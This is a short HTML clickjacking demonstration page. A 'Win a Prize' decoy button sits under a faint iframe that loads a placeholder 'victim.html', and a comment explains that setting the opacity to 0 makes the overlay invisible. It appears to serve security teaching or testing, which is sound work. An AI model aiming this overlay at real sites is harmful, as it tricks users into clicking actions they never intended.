<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking Demo</title>
  <style>
    body { font-family: Arial; margin: 30px; }
    .wrap { position: relative; width: 340px; height: 200px; }
    .decoy {
      position: absolute;
      top: 120px;
      left: 35px;
      padding: 10px 20px;
      background: green;
      color: white;
      border: none;
      font-size: 15px;
      z-index: 1;
    }
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 340px;
      height: 200px;
      opacity: 0.25; /* Set to 0 for invisible overlay */
      z-index: 2;
      border: 1px dashed red;
    }
  </style>
</head>
<body>
  <h2>Click below to Win a Prize!</h2>
  <div class="wrap">
    <button class="decoy">Win a Prize</button>
    <iframe src="victim.html"></iframe>
  </div>
</body>
</html>
